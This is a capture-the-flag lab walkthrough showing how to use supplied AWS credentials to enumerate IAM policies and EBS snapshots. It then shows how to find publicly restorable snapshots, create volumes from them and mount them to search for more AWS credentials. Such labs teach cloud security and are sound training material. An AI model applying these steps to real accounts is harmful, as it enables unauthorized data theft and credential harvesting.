https://pwnedlabs.io/labs/loot-public-ebs-snapshots

Use the provided creds to enumerate the IAM user, ARN, and the user's policies:

```bash
aws configure --profile ebs
aws sts get-caller-identity --profile ebs        
	intern
aws iam list-attached-user-policies --user-name intern --profile ebs
	PublicSnapper
```

Enumerate the PublicSnapper policy:

```bash
aws iam get-policy --policy-arn arn:aws:iam::104506445608:policy/PublicSnapper --profile ebs
	v9
aws iam get-policy-version --policy-arn arn:aws:iam::104506445608:policy/PublicSnapper --version-id v9 --profile ebs
	ec2:DescribeSnapshots
```

Now we know we can enumerate all EBS Snapshots. Providing we have the AWS Account ID (which we do):

```bash
aws ec2 describe-snapshots --owner-ids 104506445608 --region us-east-1 --profile ebs
	SnapshotId
```

We need to check who has `createVolumePermission` on these snapshots:

```bash
aws ec2 describe-snapshot-attribute --attribute createVolumePermission --snapshot-id <snap-0123456789> --region us-east-1 --profile ebs
	Group : All
```

We see for the snapshot that the value of `Group` is set to `all`. This means any AWS user can create a volume from this public snapshot into their AWS account.
Also, enumerate public snapshots that have `restorable-by-user-ids` set to `all`:

```bash
aws ec2 describe-snapshots --owner-id self --restorable-by-user-ids all --no-paginate --region us-east-1 --profile ebs
```

EXFILTRATE: create a volume of EBS public snapshot: `AWS Console > select region us-east-1 > EC2 Service > Snapshots > Public snapshots > Snapshot ID = snap-0123456789 > Actions > Create volume from snapshot`

Then, SSH into the EC2 instance and mount the volume. Enumerate for more AWS creds and the flag.